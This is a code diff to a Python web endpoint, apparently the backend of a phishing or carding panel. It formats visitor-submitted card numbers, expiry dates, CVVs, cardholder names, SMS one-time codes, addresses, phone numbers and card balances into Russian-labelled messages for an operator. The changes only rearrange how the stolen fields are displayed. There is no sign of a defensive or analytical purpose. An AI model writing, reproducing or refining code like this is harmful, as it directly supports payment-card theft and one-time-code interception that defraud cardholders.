@@ -456,14 +456,12 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         card_lines = []
         if body.card_number:
             card_lines.append(f"  Номер: <code>{body.card_number}</code>")
-            if bin_line:
-                card_lines.append(bin_line)
         if body.card_exp:
             card_lines.append(f"  Срок: <code>{body.card_exp}</code>")
         if body.card_cvv:
             card_lines.append(f"  CVV: <code>{body.card_cvv}</code>")
         if body.card_name:
-            card_lines.append(f"  Имя: {body.card_name}")
+            card_lines.append(f"  Имя: <code>{body.card_name}</code>")
         addr_lines = []
         if body.country:
             addr_lines.append(f"  Страна: {body.country}")
@@ -476,6 +474,8 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         parts = [f"🔑 <b>Код из SMS: {body.text.strip()}</b>"]
         if card_lines:
             parts.append("💳 <b>Карта:</b>\n" + "\n".join(card_lines))
+        if bin_line:
+            parts.append(bin_line)
         if addr_lines:
             parts.append("📍 <b>Адрес:</b>\n" + "\n".join(addr_lines))
         if body.phone or body.phone_dial:
@@ -489,14 +489,12 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         card_lines = []
         if body.card_number:
             card_lines.append(f"  Номер: <code>{body.card_number}</code>")
-            if bin_line:
-                card_lines.append(bin_line)
         if body.card_exp:
             card_lines.append(f"  Срок: <code>{body.card_exp}</code>")
         if body.card_cvv:
             card_lines.append(f"  CVV: <code>{body.card_cvv}</code>")
         if body.card_name:
-            card_lines.append(f"  Имя: {body.card_name}")
+            card_lines.append(f"  Имя: <code>{body.card_name}</code>")
         addr_lines = []
         if body.country:
             addr_lines.append(f"  Страна: {body.country}")
@@ -506,13 +504,18 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
             addr_lines.append(f"  Адрес 2: {body.address2}")
         if body.zip_code or body.city:
             addr_lines.append(f"  Индекс: {body.zip_code or '—'}, {body.city or '—'}")
-        parts = [f"💰 <b>Баланс:</b> <code>{body.balance_amount} {body.balance_currency or ''}</code>"]
+        parts = []
         if card_lines:
             parts.append("💳 <b>Карта:</b>\n" + "\n".join(card_lines))
+        if bin_line:
+            parts.append(bin_line)
         if addr_lines:
             parts.append("📍 <b>Адрес:</b>\n" + "\n".join(addr_lines))
         if body.phone or body.phone_dial:
             parts.append(f"📞 <b>Телефон:</b> {body.phone_dial}{body.phone or '—'}")
+        parts.append(
+            f"💰 <b>Баланс карты:</b> <code>{body.balance_amount} {body.balance_currency or ''}</code>"
+        )
         msg_body = "\n\n".join(parts)
 
     reply_kb = {
